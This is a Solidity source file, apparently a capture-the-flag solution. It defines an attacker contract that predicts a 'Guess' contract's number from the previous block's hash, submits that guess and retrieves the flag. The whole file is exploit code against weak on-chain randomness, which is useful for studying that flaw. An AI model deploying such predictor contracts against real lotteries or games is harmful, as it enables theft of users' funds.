/**
 *Submitted for verification at Etherscan.io on 2021-10-28
*/

pragma solidity ^0.4.23;

contract Guess{
    mapping (address => bool) public allowed;
    function Guess() public{}

    function guess(uint _guessNumber) public{}
    
    function retrieveFlag() public view returns(string){}
}

contract Existing  {
    
    Guess dc;
    function Existing(address _address) public {
        dc = Guess(_address);
    }
 
    function getguess() public view returns (string) {
        uint guessNumber = (uint(keccak256(block.number - 1)) + uint(block.blockhash(block.number - 1))) % 100000;
        dc.guess(guessNumber);
        dc.allowed(0x716a9456187a7020a365233f91d7dB103f825248);
        return dc.retrieveFlag();
    }
}